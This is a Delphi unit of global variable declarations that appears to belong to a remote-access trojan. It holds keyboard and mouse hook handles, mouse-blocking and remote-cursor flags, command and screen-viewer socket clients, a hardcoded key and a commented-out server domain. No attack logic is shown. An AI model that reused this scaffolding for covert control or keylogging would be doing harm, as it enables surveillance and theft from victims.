unit variaveis;

interface

uses windows, Classes,
  Zlib, conexoes, principal, vcl.Graphics,
  vcl.Controls,
  TFlatProgressBarUnit,
  vcl.Forms,
  vcl.ExtCtrls, vcl.StdCtrls;

type
  MainGlobal = record
    ID: Integer;
    vFlag: Integer;
    vFlagQR: Integer;
  end;

type
  TMibIMG = class(TImage);
  TMibnPNL = class(TPanel);
  TMibPNL = class(TEdit);

  TMibBarra = class(TFlatProgressBar)
  end;

var
  Global: MainGlobal;
  vLista: TListBox;
  Timer: TTimer;
  Janela: String;
  Casa: string;
  hmod: Cardinal;
  hwdPai: HWND;
  hwdForm: HWND;
  OndeEstar: String;
  Titulo: String;
  meunovonome: string;
  Tipo: String;
  Param4: string;
  ChaveKey: String;
  IdServe: string;
  WinVTemp: String;
  IsAdmin: string;
  KeyMx: string =
    'BAUdGYGlgX3wUY4XrGGt9z6CrGnnlmpgCaEIjtVSM2U7lYOwieLiZxs8v5df4YMnVY273VQ5jA4wdJvTR0P5r3y28crWsXscOWSW6IPkjwCg7WWUH1mCyA3Dhh8A0123456789';
  Barra: string = '\';
  Versionx: string = '500-007';
  handle, loaded: THandle;
  Tlistar: TStringList;
  Inicializado: Boolean;
  vFlagScree: Integer;
  RunMui: String;
  // ----------------------------------------------------------------------------
  Animacao: Boolean;
  dwmComp: Boolean;
  RecebeuClipBoard: Boolean;
  FCursor: Boolean;
  CursorRemoto: Boolean;
  MoverMouse: Boolean;
  NivelCompressao: TCompressionLevel;
  NUMEROLINHAS: Integer;
  NUMEROCOLUNAS: Integer;
  Zoom: Integer;
  //mem_str: TStringList = nil;
  // ----------------------------------------------------------------------------
  CasaOK: Boolean;
  BitOK: Boolean;
  bBlockMouse: Boolean;
  MoverCursor: Boolean;
  okClear: Boolean;
  ProcessaOK: Boolean;
  // ----------------------------------------------------------------------------
  vFlagExit: Integer;
  KeyCapt: HHook;
  hkHookMouse: HHook;
  hkLock: HHook = 0;
  ClearOK: Integer = 0;

  // ----------------------------------------------------------------------------

  Texto: String;
  Pasta: String = '';
  hTimer: UINT = 0; // handle do timer
  hClear: UINT = 0; // handle do timer
  // NextHandle: HWND;

  strDeskTop: Integer;
  // ----------------------------------------------------------------------------

  cmdPrincipal: TClientePrincipal;
  CmdSocket: TClienteCmd;
  SocketViewer: TClienteViewer;
  // ----------------------------------------------------------------------------
  objBmpQrCode: TBitmap;
  // ----------------------------------------------------------------------------
  ServidorIP: String;
  // ServidorIP:String='brincadeirinhas.proroyalprime.info';
  // ServidorTemp: string = '';
  PortaServe: Integer;

  // //piau 01

implementation
      uses umodulo;
{ TvEr }

initialization

end.
